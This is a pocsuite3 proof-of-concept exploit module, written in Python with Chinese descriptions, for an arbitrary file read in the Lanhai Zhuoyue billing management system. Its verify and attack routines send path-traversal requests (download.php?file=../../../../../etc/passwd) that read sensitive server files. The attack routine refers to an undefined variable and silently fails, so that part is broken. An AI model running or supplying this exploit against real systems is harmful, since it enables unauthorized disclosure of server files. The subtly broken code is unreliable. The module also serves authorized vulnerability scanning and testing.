import re, base64
from pocsuite3.lib.core.data import logger
from collections import OrderedDict
from urllib.parse import urljoin
from requests.exceptions import ReadTimeout
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptString, OptItems, OptDict, VUL_TYPE
from pocsuite3.lib.utils import get_middle_text

class DemoPOC(POCBase):
    vulID = '11'  
    author = ['']
    name = '蓝海卓越 计费管理系统 download.php 任意文件读取漏洞'
    desc = '''蓝海卓越计费管理系统 download.php文件存在任意文件读取漏洞，攻击者通过 ../ 遍历目录可以读取服务器上的敏感文件
    '''
    appPowerLink = '蓝海卓越'
    appName = '蓝海卓越计费管理系统'
    appVersion = '未知版本'
    samples = []
    install_requires = ['']
    vulType = VUL_TYPE.PATH_DISCLOSURE
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        o["filename"] = OptString("/etc/passwd", description='文件读取自定义命令')
        return o

    def _verify(self):
        result = {}
        url = self.url.rstrip('/') + "/download.php?file=../../../../.." + self.get_option("filename")
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
        }
        try:
            r = requests.get(url, headers=headers, timeout=5)
            if 'root:' in r.text and r.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['File'] = self.get_option("filename")
                result['VerifyInfo']['Response'] = r.text
        except Exception as ex:
            pass

        return self.parse_output(result)
    
    def _attack(self):
        result = {}
        url = self.url.rstrip('/') + "/download.php?file=../../../../.." + self.get_option("filename")
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
        }
        try:
            r = requests.get(url, headers=headers, timeout=5)
            if resp.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['File'] = self.get_option("filename")
                result['VerifyInfo']['Response'] = r.text
        except Exception as ex:
            pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)